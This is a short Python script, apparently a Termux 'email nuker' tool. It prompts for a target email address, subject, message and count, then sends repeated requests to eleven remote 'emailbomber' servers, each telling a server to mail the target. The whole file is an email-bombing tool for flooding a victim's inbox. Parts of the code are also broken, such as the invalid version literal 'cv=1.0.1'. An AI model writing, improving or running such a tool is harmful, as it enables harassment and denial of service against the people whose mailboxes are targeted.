import requests 
import random
import sys
cv=1.0.1
lv=int(requests.get("https://raw.githubusercontent.com/bagarrattaa/email-nuker/main/.version").text)
if lv> cv: 
    print ("version "+lv+"is available")
    print("to update bombing script run this command in termux")
    print("pkg up -y ; cd ~ ; rm -rf email-nuker ; git clone https://github.com/bagarrattaa/email-nuker")
    sys.exit()
else: 
    to=str(input("enter target email to bomb "))
    sub=str(input("enter subject "))
    msg=str(input("enter message "))
    # print (msg)
    # print(sub)
    srvrlist={1:"https://emailbomber-1.herokuapp.com",2:"https://emailbomber-2.herokuapp.com",3:"https://emailbomber-3.herokuapp.com",4:"https://emailbomber-4.herokuapp.com",5:"https://emailbomber-5.herokuapp.com",6:"https://emailbomber-6.herokuapp.com",7:"https://emailbomber-7.herokuapp.com",8:"https://emailbomber-8.herokuapp.com",9:"https://emailbomber-9.herokuapp.com",10:"https://emailbomber-10.herokuapp.com",11:"https://emailbomber-11.herokuapp.com"}
    am=int(input("enter amount of msgs to send"))
    for i in range(0,am): 
        srvr=random.randint(1,11)
        req=requests.get(srvrlist.get(srvr)+"/bomb/"+to+"/"+sub+"/"+msg)
        if req.text=="Sent": 
            print (i+1)
        else: 
            print ("failed to send msg ")
            break